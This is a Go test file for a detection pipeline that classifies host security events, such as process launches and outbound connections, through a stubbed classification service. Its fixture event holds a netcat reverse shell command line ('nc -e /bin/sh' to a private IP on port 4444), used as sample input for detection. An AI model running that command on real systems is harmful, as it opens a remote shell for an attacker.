package main

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"
)

type layaStub struct {
	mu       sync.Mutex
	requests []LayaRequest
}

func (s *layaStub) record(req LayaRequest) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.requests = append(s.requests, req)
}

func (s *layaStub) questionsFor(id string) []LayaChoiceQuestion {
	s.mu.Lock()
	defer s.mu.Unlock()
	var out []LayaChoiceQuestion
	for _, req := range s.requests {
		if q, ok := req.Questions[id]; ok {
			out = append(out, q)
		}
	}
	return out
}

func (s *layaStub) count() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.requests)
}

// newClassifierServer replies to the tactic question with tacticAnswer and to the
// category question with categoryAnswer, recording every request.
func newClassifierServer(t *testing.T, stub *layaStub, tacticAnswer, categoryAnswer LayaAnswer) *LayaClient {
	t.Helper()

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		raw, err := io.ReadAll(r.Body)
		if err != nil {
			t.Errorf("failed to read body: %v", err)
			return
		}

		var req LayaRequest
		if err := json.Unmarshal(raw, &req); err != nil {
			t.Errorf("failed to decode body: %v", err)
			return
		}
		stub.record(req)

		answers := map[string]LayaAnswer{}
		for id := range req.Questions {
			if id == tacticQuestionID {
				answers[id] = tacticAnswer
			} else {
				answers[id] = categoryAnswer
			}
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(LayaResponse{ID: "stub", Model: "english", Answers: answers})
	}))
	t.Cleanup(srv.Close)

	return NewLayaClient(LayaConfig{Address: srv.URL})
}

func unclassifiedExecve() Event {
	event := Event{
		EventType:   EventTypeExecve,
		EventID:     "evt-1",
		HostName:    "host-1",
		User:        "root",
		ImagePath:   "/usr/bin/nc",
		CommandLine: "nc -e /bin/sh 10.0.0.5 4444",
		WorkingDir:  "/tmp",
		ProcessID:   4242,
		ProcessGUID: "guid-1",
	}
	applyAttackTaxonomy(&event, CategoryCommand, 0, CategorySourceRules)
	return event
}

func TestClassifyTwoStageHappyPath(t *testing.T) {
	stub := &layaStub{}
	client := newClassifierServer(t, stub,
		LayaAnswer{Type: "choice", Choice: TacticExecution, Confidence: 0.91},
		LayaAnswer{Type: "choice", Choice: "reverse_shell", Confidence: 0.83},
	)

	classifier := NewClassifier(client, 0.5, 1)
	event := unclassifiedExecve()
	classifier.Classify(context.Background(), &event)

	if event.Category != "reverse_shell" {
		t.Errorf("category = %q, want reverse_shell", event.Category)
	}
	if event.Tactic != TacticExecution {
		t.Errorf("tactic = %q, want %s", event.Tactic, TacticExecution)
	}
	if event.CategorySource != CategorySourceLaya {
		t.Errorf("source = %q, want %q", event.CategorySource, CategorySourceLaya)
	}
	if event.TechniqueID != "T1059.004" {
		t.Errorf("technique = %q, want T1059.004", event.TechniqueID)
	}
	if event.CategoryConfidence != 0.83 {
		t.Errorf("confidence = %v, want 0.83", event.CategoryConfidence)
	}

	if stub.count() != 2 {
		t.Fatalf("expected 2 laya calls, got %d", stub.count())
	}

	tacticQ := stub.questionsFor(tacticQuestionID)
	if len(tacticQ) != 1 {
		t.Fatalf("expected 1 tactic question, got %d", len(tacticQ))
	}
	if _, ok := tacticQ[0].Criteria[TacticExecution]; !ok {
		t.Errorf("tactic question did not offer the execution option: %v", tacticQ[0].Criteria)
	}

	categoryQ := stub.questionsFor(categoryQuestionID)
	if len(categoryQ) != 1 {
		t.Fatalf("expected 1 category question, got %d", len(categoryQ))
	}
	if _, ok := categoryQ[0].Criteria["reverse_shell"]; !ok {
		t.Errorf("category question did not offer reverse_shell: %v", categoryQ[0].Criteria)
	}
	if _, ok := categoryQ[0].Criteria["suspicious_download"]; ok {
		t.Error("category question leaked options from another tactic")
	}
}

func TestClassifySendsStructuredEventState(t *testing.T) {
	stub := &layaStub{}
	client := newClassifierServer(t, stub,
		LayaAnswer{Type: "choice", Choice: TacticDiscovery, Confidence: 0.8},
		LayaAnswer{Type: "choice", Choice: "file_discovery", Confidence: 0.8},
	)

	classifier := NewClassifier(client, 0.5, 1)
	event := unclassifiedExecve()
	event.FilePath = "/var/log/auth.log"
	event.FileFlags = "O_RDONLY"
	classifier.Classify(context.Background(), &event)

	stub.mu.Lock()
	defer stub.mu.Unlock()

	if len(stub.requests) == 0 {
		t.Fatal("no request recorded")
	}
	state, ok := stub.requests[0].State.(map[string]any)
	if !ok {
		t.Fatalf("state is %T, want an object", stub.requests[0].State)
	}
	if state["event_type"] != EventTypeExecve {
		t.Errorf("state event_type = %v", state["event_type"])
	}
	process, ok := state["process"].(map[string]any)
	if !ok {
		t.Fatalf("state process is %T, want an object", state["process"])
	}
	if process["command"] != "nc -e /bin/sh 10.0.0.5 4444" {
		t.Errorf("state process command = %v", process["command"])
	}
	if process["binary"] != "nc" {
		t.Errorf("state process binary = %v, want nc", process["binary"])
	}
	file, ok := state["file"].(map[string]any)
	if !ok {
		t.Fatalf("state file is %T, want an object", state["file"])
	}
	if file["name"] != "auth.log" {
		t.Errorf("state file name = %v, want auth.log", file["name"])
	}
	if _, present := state["network"]; present {
		t.Error("state should omit network for an event with no socket data")
	}
	if state["rule_category"] != CategoryCommand {
		t.Errorf("state rule_category = %v, want %q", state["rule_category"], CategoryCommand)
	}
}

func TestClassifyIncludesNetworkState(t *testing.T) {
	stub := &layaStub{}
	client := newClassifierServer(t, stub,
		LayaAnswer{Type: "choice", Choice: TacticCommandAndControl, Confidence: 0.9},
		LayaAnswer{Type: "choice", Choice: "suspicious_outbound", Confidence: 0.9},
	)

	classifier := NewClassifier(client, 0.5, 1)
	event := Event{EventType: EventTypeConnect, EventID: "evt-net", RemoteAddr: "10.0.0.9", RemotePort: 4444}
	applyAttackTaxonomy(&event, CategoryNetwork, 0, CategorySourceRules)
	classifier.Classify(context.Background(), &event)

	stub.mu.Lock()
	defer stub.mu.Unlock()

	state := stub.requests[0].State.(map[string]any)
	network, ok := state["network"].(map[string]any)
	if !ok {
		t.Fatalf("state network is %T, want an object", state["network"])
	}
	if network["remote_addr"] != "10.0.0.9" {
		t.Errorf("remote_addr = %v", network["remote_addr"])
	}
	if network["remote_port"].(float64) != 4444 {
		t.Errorf("remote_port = %v", network["remote_port"])
	}
}

func TestClassifyBenignTacticSkipsSecondStage(t *testing.T) {
	stub := &layaStub{}
	client := newClassifierServer(t, stub,
		LayaAnswer{Type: "choice", Choice: TacticBenign, Confidence: 0.95},
		LayaAnswer{Type: "choice", Choice: "reverse_shell", Confidence: 0.99},
	)

	classifier := NewClassifier(client, 0.5, 1)
	event := unclassifiedExecve()
	event.CommandLine = "ls -la /var/log"
	event.ImagePath = "/bin/ls"
	classifier.Classify(context.Background(), &event)

	if event.Category != CategoryBenign {
		t.Errorf("category = %q, want %q", event.Category, CategoryBenign)
	}
	if event.Tactic != TacticBenign {
		t.Errorf("tactic = %q, want %q", event.Tactic, TacticBenign)
	}
	if event.CategorySource != CategorySourceLaya {
		t.Errorf("source = %q, want %q", event.CategorySource, CategorySourceLaya)
	}
	if stub.count() != 1 {
		t.Errorf("expected only the tactic call for a benign verdict, got %d calls", stub.count())
	}
}

func TestClassifyKeepsRuleCategoryWhenTacticConfidenceLow(t *testing.T) {
	stub := &layaStub{}
	client := newClassifierServer(t, stub,
		LayaAnswer{Type: "choice", Choice: TacticExecution, Confidence: 0.2},
		LayaAnswer{Type: "choice", Choice: "reverse_shell", Confidence: 0.99},
	)

	classifier := NewClassifier(client, 0.5, 1)
	event := unclassifiedExecve()
	classifier.Classify(context.Background(), &event)

	if event.Category != CategoryCommand {
		t.Errorf("category = %q, want the untouched rule default %q", event.Category, CategoryCommand)
	}
	if event.CategorySource != CategorySourceRules {
		t.Errorf("source = %q, want %q", event.CategorySource, CategorySourceRules)
	}
	if stub.count() != 1 {
		t.Errorf("expected the run to stop after a low-confidence tactic, got %d calls", stub.count())
	}
}

func TestClassifyKeepsRuleCategoryWhenCategoryConfidenceLow(t *testing.T) {
	stub := &layaStub{}
	client := newClassifierServer(t, stub,
		LayaAnswer{Type: "choice", Choice: TacticExecution, Confidence: 0.88},
		LayaAnswer{Type: "choice", Choice: "reverse_shell", Confidence: 0.3},
	)

	classifier := NewClassifier(client, 0.5, 1)
	event := unclassifiedExecve()
	classifier.Classify(context.Background(), &event)

	if event.Category != CategoryCommand {
		t.Errorf("category = %q, want %q", event.Category, CategoryCommand)
	}
	if event.Tactic != "" {
		t.Errorf("tactic = %q, want empty when the category stage is not trusted", event.Tactic)
	}
	if stub.count() != 2 {
		t.Errorf("expected both stages to run, got %d calls", stub.count())
	}
}

func TestClassifySkipsEventsWithRuleCategory(t *testing.T) {
	stub := &layaStub{}
	client := newClassifierServer(t, stub,
		LayaAnswer{Type: "choice", Choice: TacticExecution, Confidence: 0.99},
		LayaAnswer{Type: "choice", Choice: "reverse_shell", Confidence: 0.99},
	)

	classifier := NewClassifier(client, 0, 1)
	event := unclassifiedExecve()
	applyAttackTaxonomy(&event, "curl_pipe", 0.95, CategorySourceRules)
	classifier.Classify(context.Background(), &event)

	if event.Category != "curl_pipe" {
		t.Errorf("category = %q, want curl_pipe", event.Category)
	}
	if stub.count() != 0 {
		t.Errorf("expected no laya calls for a matched rule, got %d", stub.count())
	}
}

func TestClassifierDisabledWithoutClient(t *testing.T) {
	classifier := NewClassifier(nil, 0.5, 1)
	if classifier.Enabled() {
		t.Error("classifier without a laya client should be disabled")
	}

	event := unclassifiedExecve()
	classifier.Classify(context.Background(), &event)
	if event.Category != CategoryCommand {
		t.Errorf("category = %q, want %q", event.Category, CategoryCommand)
	}
}

func TestClassifySurvivesLayaOutage(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer srv.Close()

	classifier := NewClassifier(NewLayaClient(LayaConfig{Address: srv.URL}), 0.5, 1)
	event := unclassifiedExecve()
	classifier.Classify(context.Background(), &event)

	if event.Category != CategoryCommand {
		t.Errorf("category = %q, want the heuristic fallback %q", event.Category, CategoryCommand)
	}
	if event.CategorySource != CategorySourceRules {
		t.Errorf("source = %q, want %q", event.CategorySource, CategorySourceRules)
	}
}

func TestClassifyHandlesNilEvent(t *testing.T) {
	classifier := NewClassifier(NewLayaClient(LayaConfig{Address: "http://127.0.0.1:1"}), 0.5, 1)
	classifier.Classify(context.Background(), nil)
}
